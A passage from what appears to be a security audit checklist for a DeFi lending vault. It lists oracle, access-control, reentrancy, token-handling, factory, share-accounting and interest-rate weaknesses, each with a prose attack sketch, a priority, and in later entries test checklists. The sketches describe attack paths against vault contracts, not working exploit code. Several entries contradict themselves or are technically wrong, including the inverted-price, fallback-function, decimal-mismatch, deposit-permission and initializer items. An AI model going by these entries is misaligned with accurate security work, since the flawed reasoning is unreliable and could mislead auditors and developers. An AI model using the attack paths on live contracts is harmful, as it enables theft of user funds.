- **Priority:** 5/5

**PR-ORACLE-002 - Inverted Price Feed (Token/USD instead of USD/Token)**
- **Pattern:** Price feed returns reciprocal (e.g., 1/ETH instead of ETH price)
- **Root cause:** Wrong pair selected in oracle (e.g., DAI/ETH instead of ETH/DAI)
- **Attack sketch:**
  1. Oracle for ETH configured as 1/ETH; actual price $2000, feed returns 0.0005e18
  2. LTV calc: `collateral * 0.0005e18 / debt` → hugely understated
  3. Attacker deposits 1 ETH, borrows 10M; should only borrow 1000
- **Priority:** 5/5

**PR-ORACLE-003 - TWAP Manipulation (Flash Loan)**
- **Pattern:** Vault uses short TWAP (15-block window); attacker flash-loans massive amount, calls vault, price returns to normal
- **Root cause:** TWAP window too short to resist flash loan
- **Attack sketch:**
  1. Attacker flashloans 50M USDC from Uniswap
  2. Calls vault deposit with flashloaned amount
  3. Price in Uniswap spikes due to large deposit
  4. Vault's TWAP window captures this spike
  5. Interest rate controller sees spike; adjusts rates
  6. Attacker repays flashloan; normal TWAP follows
- **Priority:** 4/5

**PR-ORACLE-004 - Chainlink Price Round Mismatch**
- **Pattern:** Vault uses `latestRoundData()` but doesn't validate that returned round is current
- **Root cause:** Missing `roundId > lastRoundId` check
- **Attack sketch:**
  1. Attacker reads Chainlink oracle
  2. During transition between price rounds, attacker calls vault
  3. Vault fetches old round data (not latest)
  4. Attacker exploits price lag
- **Priority:** 3/5

**PR-ORACLE-005 - Oracle Fallback Chain Broken**
- **Pattern:** If primary oracle fails, fallback oracle not called; liquidation reverts
- **Root cause:** Error not caught; function reverts instead of trying fallback
- **Attack sketch:**
  1. Primary oracle goes down (e.g., Chainlink node failure)
  2. Attacker triggers liquidation; tx reverts
  3. Protocol cannot liquidate underwater positions; bad debt accumulates
- **Priority:** 4/5

**PR-ORACLE-006 - Price Decimals Mismatch**
- **Pattern:** Oracle returns price with 8 decimals; vault expects 18
- **Root cause:** No decimals normalization in oracle fetch
- **Attack sketch:**
  1. Chainlink USDC/USD returns 1e8 (for $1); vault uses as 1e18
  2. LTV calc: `deposit * 1e8 / debt` = undervalued by 1e10
- **Priority:** 5/5

**PR-ORACLE-007 - Multi-Hop Oracle Dependency**
- **Pattern:** Vault fetches price via DEX TWAP; DEX's own token price feeds into calculation
- **Root cause:** Circular dependency; DEX price depends on collateral price
- **Attack sketch:**
  1. Attacker manipulates DEX reserves for the collateral pair
  2. TWAP calculation bounces back, affecting collateral price
  3. Feedback loop exploitable for rate manipulation
- **Priority:** 4/5

**PR-ORACLE-008 - Sequencer Downtime / Out-of-Sync L2 Oracle**
- **Pattern:** On L2 (Arbitrum, Optimism), oracle price may be fetched when sequencer is down; price is stale
- **Root cause:** Missing sequencer health check in oracle call
- **Attack sketch:**
  1. Sequencer goes down for 30 minutes
  2. Attacker can still call vault (though price is stale)
  3. Liquidations occur at out-of-sync prices
- **Priority:** 3/5 (L2-specific)

**PR-ORACLE-009 - Oracle Constructor Parameter Injection**
- **Pattern:** Oracle deployed with wrong pair or decimals; immutable; cannot be fixed
- **Root cause:** Factory accepts oracle params without validation
- **Attack sketch:**
  1. Factory initialized with oracle = USDC/USDT (worthless pair)
  2. Price always ~1e18; cannot distinguish collateral movement
- **Priority:** 3/5

**PR-ORACLE-010 - Price Consistency Across Multiple Collaterals**
- **Pattern:** Vault accepts multiple collaterals; prices fetched in different txs; temporal mismatch exploitable
- **Root cause:** No atomicity guarantee for multi-price fetch
- **Attack sketch:**
  1. Vault has USDC + USDT collateral
  2. Attacker deposits USDC, price fetched at 1.00
  3. Attacker deposits USDT, price fetched 2 blocks later at 0.99
  4. Attacker exploits the timing gap; liquidates USDT at old price
- **Priority:** 3/5

### Permissions & Access Control (PR-PERM-001 … PR-PERM-050)

**PR-PERM-001 - Permit Replay Attack (Missing Chain ID)**
- **Pattern:** `permit()` function does not include `chainId` in signature domain; attacker replays on fork
- **Root cause:** EIP712 domain missing chainId component
- **Attack sketch:**
  1. On mainnet, user signs permit to approve attacker for 1000 shares
  2. Chain forks; attacker replays same permit on testnet/sidechain vault
  3. Attacker gains unlimited spend on forked vault
- **Priority:** 4/5

**PR-PERM-002 - Permit Nonce Reuse (Not Incremented)**
- **Pattern:** `permit()` does not increment nonce; same signature can be used multiple times
- **Root cause:** Missing `nonce++` in permit logic
- **Attack sketch:**
  1. User signs permit (nonce = 0)
  2. Attacker submits permit TX 1; nonce still 0
  3. Attacker submits permit TX 2 with same nonce; succeeds again
- **Priority:** 5/5

**PR-PERM-003 - Deposit/Withdraw Permission Not Validated**
- **Pattern:** `deposit()` does not check `msg.sender == receiver`; attacker can deposit on behalf of any user
- **Root cause:** Missing access control in deposit function
- **Attack sketch:**
  1. Attacker calls `vault.deposit(1000, victimAddress)` without victim's permission
  2. Victim's balance increases; victim now has debt obligation
- **Priority:** 4/5

**PR-PERM-004 - Factory Deployer Address Changeable**
- **Pattern:** Factory stores deployer address; setter function allows owner to change it post-deployment
- **Root cause:** Mutable deployer address
- **Attack sketch:**
  1. Owner calls `setDeployer(attacker)`
  2. Attacker deploys new vaults with malicious params
  3. Protocol appears to endorse malicious vaults
- **Priority:** 4/5

**PR-PERM-005 - Initialize Re-entry**
- **Pattern:** `initialize()` can be called multiple times if check is weak (e.g., missing or using mutable flag)
- **Root cause:** Initializer guard implemented incorrectly (e.g., `if (initialized) revert` instead of `initialized = true`)
- **Attack sketch:**
  1. Attacker calls `initialize(0, 0, attacker)` twice
  2. After first call, initializer flag not set; second call succeeds
  3. Vault parameters overwritten
- **Priority:** 5/5

**PR-PERM-006 - Liquidator Incentive Manipulation**
- **Pattern:** Liquidation reward calculated based on `msg.sender` permissions (e.g., whitelisted liquidators get higher reward)
- **Root cause:** Liquidator whitelist enforced but attacker can bribe/impersonate
- **Attack sketch:**
  1. Attacker front-runs legitimate liquidator
  2. Calls liquidation as non-whitelisted (lower reward)
  3. Or exploits liquidator whitelist to capture higher reward
- **Priority:** 3/5

**PR-PERM-007 - Fee Collector Address Hardcoded**
- **Pattern:** Fee receiver is hardcoded in vault constructor; attacker controls constructor, sets fee receiver to attacker
- **Root cause:** Constructor params not validated (factory allows arbitrary fee receiver)
- **Attack sketch:**
  1. Attacker deploys vault via factory, sets `feeReceiver = attacker`
  2. All interest accruals flow to attacker indefinitely
- **Priority:** 4/5

**PR-PERM-008 - Pauser Address Immutable but Set to Attacker**
- **Pattern:** Pauser address immutable (good) but factory allows deployer to set it to attacker
- **Root cause:** Factory does not validate pauser identity
- **Attack sketch:**
  1. Attacker deploys vault, sets pauser = attacker
  2. Attacker pauses vault at critical moment (e.g., liquidation opportunity)
  3. Victims cannot withdraw; attacker liquidates
- **Priority:** 4/5

**PR-PERM-009 - Vault Upgrade Authority Delegation**
- **Pattern:** Vault can be upgraded; upgrade authority is set to attacker-controlled admin
- **Root cause:** Factory does not validate upgrade admin
- **Attack sketch:**
  1. Attacker deployer sets vault admin = attacker
  2. Attacker upgrades vault logic to steal collateral
- **Priority:** 5/5

**PR-PERM-010 - Rate Controller Authorization Bypass**
- **Pattern:** Rate update not properly signed; anyone can call `setRate()`
- **Root cause:** Missing signature verification in rate update
- **Attack sketch:**
  1. Attacker calls `rateController.setRate(1000%)`
  2. All positions become undercollateralized; liquidation cascade
- **Priority:** 5/5

### Reentrancy & CEI Violations (PR-REENT-001 … PR-REENT-050)

**PR-REENT-001 - Reentrancy in Interest Accrual**
- **Pattern:** `_accrueInterest()` updates share price, then calls oracle.getPrice() (external), then updates state
- **Root cause:** CEI violation; state updated, external call, state updated again
- **Attack sketch:**
  1. Attacker deposits, triggers accrual
  2. During oracle call, attacker reenters via ERC777 callback
  3. Attacker withdraws at stale share price
  4. After reentry, accrual completes; share price recalculated
- **Priority:** 5/5

**PR-REENT-002 - Reentrancy in Liquidation**
- **Pattern:** Liquidation seizes collateral, transfers to liquidator, then updates debt state
- **Root cause:** CEI violation; collateral transferred before state updated
- **Attack sketch:**
  1. Liquidator receives collateral via transfer callback (ERC777)
  2. Reenters to trigger additional liquidations
  3. Each reentered liquidation uses stale debt state
- **Priority:** 5/5

**PR-REENT-003 - Callback-Based Withdrawal Reentrancy**
- **Pattern:** Vault transfers collateral to user; user's contract receives token via transfer callback; reenters vault
- **Root cause:** No reentrancy guard; CEI not followed
- **Attack sketch:**
  1. Attacker's contract calls `vault.withdraw(1000)`
  2. During transfer callback, attacker reenters `withdraw(1000)` again
  3. State still shows 1000; attacker withdraws double
- **Priority:** 5/5

**PR-REENT-004 - ERC777 Callback Chain**
- **Pattern:** ERC777 token callbacks allow reentrancy; vault not protected against ERC777 callbacks
- **Root cause:** No reentrancy guard; assumes ERC20 only
- **Attack sketch:**
  1. Vault holds ERC777-wrapped collateral
  2. Attacker's contract receives tokensReceived callback
  3. Reenters vault deposit within callback
- **Priority:** 4/5

**PR-REENT-005 - Unsafe External Call Without Return Check**
- **Pattern:** `(bool success, ) = target.call{value: amount}("")` but success not checked; execution continues
- **Root cause:** Missing require(success)
- **Attack sketch:**
  1. External call fails (e.g., recipient is attacker contract that reverts)
  2. Execution continues; state updated as if call succeeded
  3. Attacker exploits state inconsistency
- **Priority:** 3/5

**PR-REENT-006 - Flash Loan Callback Reentrancy**
- **Pattern:** Flash loan callback allows reentrancy; attacker reenters vault within flash loan callback
- **Root cause:** No reentrancy guard; flash loan not considered
- **Attack sketch:**
  1. Attacker flash-loans collateral
  2. Within flash loan callback, attacker deposits collateral into vault (reenters)
  3. Vault balance changes; attacker repays flash loan from vault
- **Priority:** 4/5

**PR-REENT-007 - Approval Race + Reentrancy**
- **Pattern:** Approve collateral transfer; external call; reenters to spend approved amount
- **Root cause:** CEI violation; approval set before state update
- **Attack sketch:**
  1. User approves 1000 to vault
  2. Vault deposits; external call
  3. Reenters to transfer approved amount again
- **Priority:** 3/5

**PR-REENT-008 - Cross-Contract Reentrancy (Vault → Other Vault)**
- **Pattern:** Vault A calls external contract; external contract is Vault B; Vault B reenters Vault A
- **Root cause:** Reentrancy guard only on same contract; not on external contracts
- **Attack sketch:**
  1. Attacker controls Vault B
  2. Calls `Vault A.deposit()`; during oracle call, Vault B calls back to Vault A
  3. Vault A's state is mid-update when Vault B accesses it
- **Priority:** 3/5

**PR-REENT-009 - Reentrancy via Delegatecall**
- **Pattern:** Vault uses delegatecall to external contract; external contract reenters vault
- **Root cause:** Delegatecall maintains same context; reentrancy guard not in delegated context
- **Attack sketch:**
  1. Vault delegates to interest controller
  2. Interest controller makes external call
  3. Attacker reenters original vault from external call
- **Priority:** 4/5

**PR-REENT-010 - Batch Operation Reentrancy**
- **Pattern:** Vault loops through operations (e.g., distribute interest); reentrancy during loop corrupts iteration
- **Root cause:** Loop state not protected; reentrancy modifies state during iteration
- **Attack sketch:**
  1. Vault distributes interest to 100 users
  2. During user #50's transfer, attacker reenters
  3. Distribution loop state corrupted; some users skipped
- **Priority:** 3/5

### ERC20 Quirks & Token Handling (PR-TOKEN-001 … PR-TOKEN-050)

**PR-TOKEN-001 - Fee-on-Transfer Token Not Accounted**
- **Pattern:** Vault transfers collateral via `token.transfer(address, amount)` but token has 0.1% fee; vault balance mismatches state
- **Root cause:** Fee not deducted from deposited amount
- **Attack sketch:**
  1. Attacker deposits 1000 USDT (fee-on-transfer)
  2. Contract receives 999; state records 1000
  3. Attacker withdraws 1000; contract reverts (insufficient balance)
- **Priority:** 4/5

**PR-TOKEN-002 - Missing Return Value Check**
- **Pattern:** `token.transfer()` or `token.approve()` does not return bool; vault assumes success
- **Root cause:** Non-standard ERC20 token; return value not checked
- **Attack sketch:**
  1. Collateral token.transfer() returns nothing (no bool)
  2. Vault assumes transfer succeeded; continues
  3. Attacker deposits; balance not updated on-chain (malicious token)
- **Priority:** 3/5

**PR-TOKEN-003 - Rebase Token (stETH) Balance Change**
- **Pattern:** Vault holds rebase token; balance increases automatically; accounting does not refresh
- **Root cause:** `totalAssets()` cached; rebase not re-measured
- **Attack sketch:**
  1. Vault deposits stETH; balance = 100
  2. Rebase occurs; balance increases to 105 (automatic)
  3. Vault's `totalAssets()` still reports 100 (stale)
  4. Attacker redeems shares at inflated price
- **Priority:** 4/5

**PR-TOKEN-004 - Deflationary Token (Burning)**
- **Pattern:** Token burns a portion of transfers; vault receives less than sent
- **Root cause:** Burn mechanism not accounted in balance tracking
- **Attack sketch:**
  1. Attacker deposits 1000 tokens with 1% burn
  2. Vault receives 990; state records 1000
  3. Withdrawal fails or share price overstated
- **Priority:** 3/5

**PR-TOKEN-005 - Wrapped Token Unwrap Surprise**
- **Pattern:** Vault holds wrapped token (e.g., wETH); underlying can be claimed; accounting assumes wrapped balance
- **Root cause:** No check for underlying token balance; only wrapped balance tracked
- **Attack sketch:**
  1. Vault holds wETH
  2. Attacker unwraps all wETH to ETH
  3. Vault balance (ETH) is now vault's responsibility; accounting breaks
- **Priority:** 2/5 (low likelihood)

**PR-TOKEN-006 - Permit Signature Malleability**
- **Pattern:** Token's permit() accepts malleable signature; attacker replays with different sig components (v, r, s)
- **Root cause:** EIP191 signature not properly validated (missing replay protection)
- **Attack sketch:**
  1. User signs permit; signature is (v, r, s)
  2. Attacker computes malleable sig: (27 - v, r, N - s)
  3. Replays permit; vault processes both signatures
- **Priority:** 2/5 (rare for modern tokens)

**PR-TOKEN-007 - Token Upgrade (Proxy) Behavior Change**
- **Pattern:** Collateral token is proxied; token owner upgrades logic; transfer behavior changes
- **Root cause:** Vault does not snapshot token behavior; assumes immutability
- **Attack sketch:**
  1. Vault deposits collateral token X (ERC20)
  2. Token X owner upgrades proxy to include 10% burn
  3. Next vault withdrawal burns 10%; accounting breaks
- **Priority:** 3/5

**PR-TOKEN-008 - Paused Token Transfer**
- **Pattern:** Token can be paused (e.g., USDC pausing during emergency); vault cannot withdraw
- **Root cause:** No fallback when token transfers are paused
- **Attack sketch:**
  1. Vault holds USDC
  2. USDC is paused by issuer
  3. Attacker attempts withdrawal; reverts
  4. Attacker can liquidate due to inability to redeem
- **Priority:** 3/5

**PR-TOKEN-009 - Rebasing Token with Precision Loss**
- **Pattern:** Rebase token (e.g., Ampleforth) changes decimals/supply; vault assumes fixed decimals
- **Root cause:** Decimal assumption not refreshed post-rebase
- **Attack sketch:**
  1. Vault holds token with 18 decimals
  2. Token rebase changes effective decimals to 15
  3. Vault's LTV calculation uses wrong decimal scaling
- **Priority:** 3/5

**PR-TOKEN-010 - Honeypot Token (Cannot Sell)**
- **Pattern:** Token allows buy but blocks sells (honeypot); vault cannot redeem collateral
- **Root cause:** Vault does not validate token transfer functionality before accepting as collateral
- **Attack sketch:**
  1. Factory accepts honeypot token as collateral
  2. Vault deposits honeypot; state records balance
  3. User cannot withdraw (sell blocked); vault becomes insolvent
- **Priority:** 2/5 (high friction to exploit; vault would not accept)

### Miscellaneous (PR-MISC-001 … PR-MISC-050)

**PR-MISC-001 - Proxy Initialization Not Protected**
- **Pattern:** Proxy's `initialize()` not protected; anyone can call on deployed proxy
- **Root cause:** Missing onlyOnce or onlyOwner guard
- **Attack sketch:**
  1. Vault proxy deployed; factory deploys impl but does not call initialize on proxy
  2. Attacker calls `proxy.initialize(0, 0, attacker)`
  3. Vault is now initialized with attacker params
- **Priority:** 5/5

**PR-MISC-002 - Implicit Fallback Function**
- **Pattern:** Vault has fallback() function without logic; accepts ETH; accounting does not update
- **Root cause:** Fallback is not declared; ETH sent is lost
- **Attack sketch:**
  1. Attacker sends 1 ETH to vault (fallback captures)
  2. Vault's ETH balance increases; state does not track it
  3. Attacker exploits dust ETH for accounting errors
- **Priority:** 2/5

**PR-MISC-003 - Overflow in Borrow Limit Calculation**
- **Pattern:** `borrowLimit = collateralValue * LTV` overflows if collateralValue is large
- **Root cause:** Missing safe math (pre-Solidity 0.8)
- **Attack sketch:**
  1. Vault holds 1M ETH (~$2B); LTV = 80%
  2. Multiplication overflows; borrowLimit wraps to small value
  3. Attacker borrows unlimited amount
- **Priority:** 4/5

**PR-MISC-004 - Underflow in Repayment**
- **Pattern:** `debtAfterRepay = debt - repayAmount` underflows if repayAmount > debt
- **Root cause:** Missing min(debt, repayAmount) check
- **Attack sketch:**
  1. Attacker's debt = 100
  2. Attacker repays 200 (more than owed)
  3. Debt underflows; becomes negative (wraps to huge value)
  4. Attacker now has credit instead of debt
- **Priority:** 4/5

**PR-MISC-005 - Liquidation Bonus Manipulation**
- **Pattern:** Liquidation bonus (e.g., 5%) set at deployment; cannot be adjusted; allows arbitrage if collateral prices drop
- **Root cause:** Immutable bonus; no mechanism to adjust
- **Attack sketch:**
  1. Bonus = 5%; collateral drops 10%
  2. Attacker liquidates underwater position; captures bonus + arbitrage
- **Priority:** 3/5

**PR-MISC-006 - Slippage Protection Missing in Liquidation**
- **Pattern:** Liquidation does not enforce minimum repayment; attacker can liquidate with tiny repayment, capturing massive collateral
- **Root cause:** No `minRepay` parameter in liquidation call
- **Attack sketch:**
  1. Position: 100 ETH collateral, 50 USDC debt
  2. Attacker calls liquidate(position, 0.01 USDC repay)
  3. Vault liquidates 1 ETH for 0.01 USDC; rest goes to attacker
- **Priority:** 4/5

**PR-MISC-007 - Batch Liquidation State Inconsistency**
- **Pattern:** Vault allows batch liquidation without checking intermediate state; first liquidation changes health factor of subsequent targets
- **Root cause:** No state snapshot before batch operation
- **Attack sketch:**
  1. Attacker liquidates user A; collateral price moves
  2. User B's health factor changes mid-batch
  3. User B should not be liquidatable; is liquidated due to A's liquidation
- **Priority:** 3/5

**PR-MISC-008 - Withdrawal Deny-of-Service via Dust**
- **Pattern:** Vault's reserve becomes dust (1 wei); withdrawal requests for more revert
- **Root cause:** No minimum reserve check; dust accumulates
- **Attack sketch:**
  1. Vault has 100 USDC reserve
  2. Attacker makes 100 withdrawals of 1 USDC each; dust accumulates
  3. Next user's 1000 USDC withdrawal fails (insufficient reserve)
- **Priority:** 3/5

**PR-MISC-009 - Missing Zero-Address Checks**
- **Pattern:** Constructor accepts collateral/stablecoin address without checking for address(0)
- **Root cause:** No require(address != 0) check
- **Attack sketch:**
  1. Factory initialized with collateral = address(0)
  2. Vault attempts to interact with address(0); calls fail
  3. Vault becomes bricked
- **Priority:** 2/5

**PR-MISC-010 - Off-by-One Error in Liquidation Threshold**
- **Pattern:** Liquidation threshold = 105%; health factor check uses `>=` instead of `>`
- **Root cause:** Boundary condition error
- **Attack sketch:**
  1. Position has HF = 105.0000001%
  2. Check: `HF >= threshold` (105% >= 105%) = true (liquidatable)
  3. Position should not be liquidatable; user is liquidated
- **Priority:** 3/5

---

## Implementation-Specific Patterns (Monolith-Tailored)

### Factory Patterns (PR-FAC-001 … PR-FAC-025)

**PR-FAC-011 - Deployment Params Not Immutable**
- **Pattern:** Factory stores vault params in mutable state; vault address can be reassociated with different params
- **Root cause:** `vaultParams[vaultAddress]` is updateable mapping
- **Attack sketch:**
  1. Vault A deployed with LTV = 80%
  2. Attacker calls `factory.setParams(vaultA, LTV = 150%)`
  3. Users interact with Vault A believing LTV = 80%; actual = 150%
- **Checklist:**
  1. Verify `vaultParams` is not a mutable mapping; should be one-time set
  2. Test: deploy vault, attempt to update params, expect revert
  3. Snapshot vault state; verify params immutable post-deployment
- **Test mapping:** TST-UNIT-030
- **Priority:** 5/5

**PR-FAC-012 - Factory Vault Registry Collision**
- **Pattern:** Factory maintains `vaults[]` array; attacker deposits to counterfactual address before official deployment, collides with registry
- **Root cause:** Counterfactual addresses not reserved during deployment
- **Attack sketch:**
  1. Attacker predicts vault address (CREATE2 hash of params)
  2. Attacker deposits 1000 tokens to counterfactual address (EOA holds; not official vault)
  3. Factory deploys official vault at same address
  4. Attacker's deposit is now in registry; attacker has early shares
- **Checklist:**
  1. Deploy multiple vaults with same params; verify addresses match (CREATE2 determinism)
  2. Attempt deposit to counterfactual before deployment
  3. Deploy vault; verify registry contains only deployed address, not counterfactual
- **Test mapping:** TST-SIM-005
- **Priority:** 4/5

**PR-FAC-013 - Interest Controller Not Injected Correctly**
- **Pattern:** Factory deploys vault without assigning interest controller; vault uses hardcoded default (wrong one)
- **Root cause:** Missing setter for controller; vault constructor cannot receive it as param
- **Attack sketch:**
  1. Factory should pass `controller = _controller` to vault
  2. Due to bug, vault always uses `DEFAULT_CONTROLLER` (hardcoded in vault)
  3. Attacker controls DEFAULT_CONTROLLER; manipulates rates
- **Checklist:**
  1. Deploy vault; verify assigned controller matches factory param
  2. Attempt to change controller post-deployment; should revert
  3. Test controller callback; verify correct controller is queried
- **Test mapping:** TST-UNIT-031
- **Priority:** 4/5

**PR-FAC-014 - Fee Token Recipient Not Validated**
- **Pattern:** Factory accepts fee receiver address without validating it's an EOA or contract (could be address(0), burned address, etc.)
- **Root cause:** No validation on fee receiver param
- **Attack sketch:**
  1. Factory initialized with feeReceiver = address(0)
  2. Vault accrues fees; tries to mint to address(0)
  3. Mints fail; fees are lost; protocol gets no revenue
- **Checklist:**
  1. Deploy with feeReceiver = address(0); verify revert
  2. Deploy with feeReceiver = vault address; verify fees accrue to vault
  3. Test fee distribution; ensure feeReceiver receives correct amount
- **Test mapping:** TST-UNIT-032
- **Priority:** 3/5

**PR-FAC-015 - Vault Implementation Not Initialized on Deployment**
- **Pattern:** Vault implementation deployed; factory does not call `initialize(0x..., disable)` on impl before deploying proxies
- **Root cause:** Missing initialization of impl contract
- **Attack sketch:**
  1. Vault impl is deployed; left uninitialized
  2. Attacker calls `impl.initialize(malicious_params)`
  3. Impl is now poisoned; all future proxies that delegate to impl see poisoned state
- **Checklist:**
  1. Deploy vault impl; attempt to call deposit
  2. Verify deposit reverts (impl not initialized) or succeeds (impl was initialized)
  3. Test proxy delegation; ensure impl state does not affect proxy state
- **Test mapping:** TST-UNIT-033
- **Priority:** 5/5

### Vault Share Accounting Patterns (PR-VAULT-011 … PR-VAULT-035)

**PR-VAULT-011 - Share Price Inflation via Direct Transfer (Donation)**
- **Pattern:** Attacker transfers collateral directly to vault (not via deposit); share price inflates; next depositor's shares round to 0
- **Root cause:** `sharePrice = totalAssets / totalShares`; totalAssets can be increased without mint
- **Attack sketch:**
  1. Attacker calls `deposit(1, attacker)` → receives 1 share (share price = 1.0)
  2. Attacker transfers 1000 tokens directly to vault (no mint)
  3. Share price = 1001 / 1 = 1001.0
  4. Next user deposits 1000 tokens → receives 1000 / 1001 = 0 shares (rounded)
  5. Attacker redeems 1 share → receives all 2001 tokens
- **Checklist:**
  1. Deposit 1 wei collateral as first depositor
  2. Transfer 1e18 tokens directly to vault
  3. Deposit 1e18 tokens as second depositor; measure shares received
  4. Verify shares = 0 or very small; attacker can redeem for full balance
- **Test mapping:** TST-UNIT-034, EXP-001
- **Priority:** 5/5

**PR-VAULT-012 - Share Rounding Leak Accumulation**
- **Pattern:** Each deposit rounds shares down; over 1000 deposits, attacker leaks 0.1–0.2% via rounding
- **Root cause:** Rounding always toward vault (down on mint, up on burn)
- **Attack sketch:**
  1. Attacker deposits 100 wei; receives 99 shares (1 wei leaked)
  2. Repeat 1000x; attacker leaks ~1000 wei
  3. Attacker liquidates leaked amount by redeeming at favorable rate
- **Checklist:**
  1. Create fuzz test: deposit random amounts 1000x
  2. Measure cumulative share price drift; should be < 0.01%
  3. Calculate leaked dust; verify dust <= acceptable threshold
- **Test mapping:** TST-FUZZ-010
- **Priority:** 3/5

**PR-VAULT-013 - Share Balance Mapping vs ERC20 Supply Mismatch**
- **Pattern:** Vault tracks shares in separate mapping; ERC20 standard `balanceOf()` is not updated
- **Root cause:** Two separate accounting systems (mapping + ERC20 state)
- **Attack sketch:**
  1. Vault mints 1000 shares via mapping; does not call ERC20 mint
  2. User calls `share.balanceOf(user)` → returns 0 (ERC20 side)
  3. User tries to transfer shares (fails due to 0 balance)
  4. Attacker exploits by calling mapping-based withdraw (bypassing ERC20 checks)
- **Checklist:**
  1. Deposit collateral; snapshot balanceOf() via ERC20 and mapping
  2. Verify both agree
  3. Attempt transfer via ERC20; verify it succeeds or fails consistently
- **Test mapping:** TST-UNIT-035
- **Priority:** 4/5

**PR-VAULT-014 - Initial Share Price Not Set Correctly**
- **Pattern:** On first deposit, share price is not set to 1.0 (1e18); instead set to 0 or some other value
- **Root cause:** `sharePrice = totalAssets / totalShares` but totalShares = 0 (division by zero or rounding)
- **Attack sketch:**
  1. First depositor deposits 1000 tokens
  2. totalShares = 0; calculation `sharePrice = 1000 / 0` reverts or returns 0
  3. Vault becomes unusable
- **Checklist:**
  1. Deploy vault; call deposit with 1000 tokens
  2. Verify shares received = 1000 (or proportional to deposit)
  3. Verify sharePrice = 1e18 (1.0)
  4. Subsequent deposits should maintain sharePrice near 1.0
- **Test mapping:** TST-UNIT-036
- **Priority:** 4/5

**PR-VAULT-015 - Share Mint During Collateral Transfer**
- **Pattern:** Share mint happens before collateral transfer completes; attacker reenters to withdraw shares before collateral arrives
- **Root cause:** CEI violation; shares minted, then collateral transferred, then state updated
- **Attack sketch:**
  1. Attacker calls `deposit(1000)`
  2. Vault mints 1000 shares to attacker
  3. During `token.transferFrom()` callback, attacker reenters
  4. Attacker calls `withdraw(1000)` before collateral arrived
  5. Withdrawal succeeds (shares exist); collateral transferred to attacker
  6. Original transfer completes; vault now has no collateral
- **Checklist:**
  1. Create reentrancy test with ERC777 callback
  2. Attempt deposit → reenter withdraw during transfer
  3. Verify reentry fails (or state is consistent)
- **Test mapping:** TST-REENT-003
- **Priority:** 5/5

### Interest Rate Controller Patterns (PR-INT-011 … PR-INT-035)

**PR-INT-011 - Rate Update Not Triggered on Block Boundary**
- **Pattern:** Interest accrual is triggered by external call; not automatically on each block; attacker exploits stale rate
- **Root cause:** Manual accrual trigger; no on-block hook
- **Attack sketch:**
  1. Block N: rate accrued
  2. Blocks N+1 to N+100: no accrual triggered; rate is stale
  3. Attacker deposits/borrows assuming rate at block N+100; actual rate from block N
  4. Attacker exploits rate discrepancy for arbitrage
- **Checklist:**
  1. Deposit collateral at block N
  2. Measure accrued interest at block N+10 without triggering accrual
  3. Manually trigger accrual; verify accumulated interest matches expected
- **Test mapping:** TST-SIM-006
- **Priority:** 3/5

**PR-INT-012 - Rate Smoothing Factor Exploitation**
- **Pattern:** Rate change capped per block; attacker can predict rate trajectory and front-run position changes
- **Root cause:** Rate changes are deterministic; cap is fixed
- **Attack sketch:**
  1. Rate = 5%; cap = 0.1% per block; rate decreasing
  2. Attacker knows rate will hit 4.5% in 5 blocks
  3. Attacker deposits now (expecting 5% for 5 blocks), then withdraws at 4.5% (saving interest)
  4. Legitimate borrowers get worse rates
- **Checklist:**
  1. Simulate 100-block rate trajectory
  2. Verify rate does not exceed cap per block
  3. Calculate attacker's savings vs legitimate user's rate
- **Test mapping:** TST-SIM-007
- **Priority:** 3/5

**PR-INT-013 - Interest Rate Oracle Dependency Staleness**
- **Pattern:** Interest controller queries collateral price oracle (for utilization-based rate); oracle is stale; rate is incorrect
- **Root cause:** Rate calculation depends on oracle; oracle age not checked
- **Attack sketch:**
  1. Oracle last updated 2 hours ago; max age = 1 hour
  2. Rate controller queries oracle; gets stale price
  3. Utilization rate calculated wrong; interest rate wrong
  4. Attacker exploits by depositing/borrowing at favorable outdated rate
- **Checklist:**
  1. Set oracle age to max + 1 block
  2. Trigger rate update
  3. Verify rate update fails (or uses fallback) or reverts
- **Test mapping:** TST-UNIT-037
- **Priority:** 4/5

**PR-INT-014 - Interest Rate Discontinuity at Block Boundary**
- **Pattern:** Rate updates at block N; user deposits at block N-1; next block (N+1) rate changes; user's accrual uses wrong rate
- **Root cause:** Rate snapshot not taken at deposit time; uses current rate
- **Attack sketch:**
  1. Block 100: rate = 5%; user deposits 1000 USDC
  2. Block 101: rate updated to 10%
  3. User's interest accrues at 10% (from block 101 onward)
  4. User should accrue at 5% for block 100, 10% for block 101+; instead accrues at 10% retroactively
- **Checklist:**
  1. Deposit at block N
  2. Trigger rate update at block N+1
  3. Measure accrued interest; verify rate applies only from block N+1 onward
- **Test mapping:** TST-UNIT-038
- **Priority:** 3/5

**PR-INT-015 - Exponential Interest Overflow**
- **Pattern:** Interest calculation `debt * (1 + rate)^blocks` overflows if blocks is large or rate is high
- **Root cause:** Naive exponentiation without overflow guards
- **Attack sketch:**
  1. Rate = 1% per block (10^-2)
  2. 1000 blocks without accrual
  3. Next accrual: `debt * 1.01^1000` ≈ `debt * 20800` (exponential explosion)
  4. If debt is large, multiplication overflows; debt wraps to negative
- **Checklist:**
  1. Set up position with high debt
  2. Advance blocks 1000+ without accrual
  3. Trigger accrual; verify debt calculation does not overflow
  4. Verify overflow is caught and reverted, not wrapped
- **Test mapping:** TST-UNIT-039
- **Priority:** 4/5

### Oracle Patterns (PR-ORACLE-011 … PR-ORACLE-035)

**PR-ORACLE-011 - Oracle Price Decimal Mismatch (8 vs 18)**
- **Pattern:** Chainlink returns 8 decimals (e.g., 1.00 USD = 100000000); vault expects 18 decimals
- **Root cause:** Oracle decimals not normalized in price fetch
- **Attack sketch:**
  1. Chainlink USDC/USD: price = 100000000 (8 decimals, representing $1)
  2. Vault uses price directly as 18-decimal; interprets as 0.0001 USD
  3. LTV calculation: `collateral * price / debt` = massive undervaluation
- **Checklist:**
  1. Mock oracle returning 8-decimal price
  2. Deposit collateral; measure LTV
  3. Compare to 18-decimal price version; verify LTV differs by 10^10
- **Test mapping:** TST-UNIT-040
- **Priority:** 5/5

**PR-ORACLE-012 - TWAP Window Manipulation (Sandwich Attack)**
- **Pattern:** TWAP window = 15 blocks; attacker flash-loans, deposits, price spikes; TWAP captures spike within window
- **Root cause:** TWAP window too short; flash loan completes within TWAP window
- **Attack sketch:**
  1. Attacker flashloans 50M USDC from Uniswap
  2. Calls `vault.deposit(50M)` → price in Uniswap spikes
  3. Within 15 blocks, TWAP window observes spike
  4. Interest rate controller reads spike; increases rates
  5. Attacker repays flashloan; price returns; but rates remain high
  6. Liquidations triggered; attacker liquidates at high rate
- **Checklist:**
